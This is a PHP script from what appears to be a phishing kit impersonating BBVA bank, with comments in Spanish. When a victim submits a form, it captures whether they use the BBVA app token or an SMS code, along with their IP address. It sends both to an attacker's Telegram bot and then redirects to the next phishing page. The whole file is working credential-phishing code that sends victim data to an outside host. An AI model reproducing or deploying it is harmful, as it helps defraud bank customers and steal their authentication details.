<?php
// Incluir el archivo data.php para obtener el token y el chat_id
include 'data.php';

// Capturar la opción seleccionada en el formulario
if (isset($_POST['security'])) {
    $selected_option = $_POST['security'];

    // Capturar la dirección IP del cliente
    $client_ip = $_SERVER['REMOTE_ADDR'];

    // Preparar el mensaje para enviar a Telegram, incluyendo la IP del cliente
    $message = "El usuario ha seleccionado la opción de seguridad: " . 
               ($selected_option == 'token' ? "Clave Token desde la App BBVA" : "Código por SMS al celular") . 
               "\nIP del cliente: " . $client_ip;

    // Enviar el mensaje a Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    file_get_contents($url);

    // Redirigir a otra página (por ejemplo, 'success.html')
    header("Location: index3.html");
    exit(); // Asegurar que el script se detenga después de la redirección
}
?>
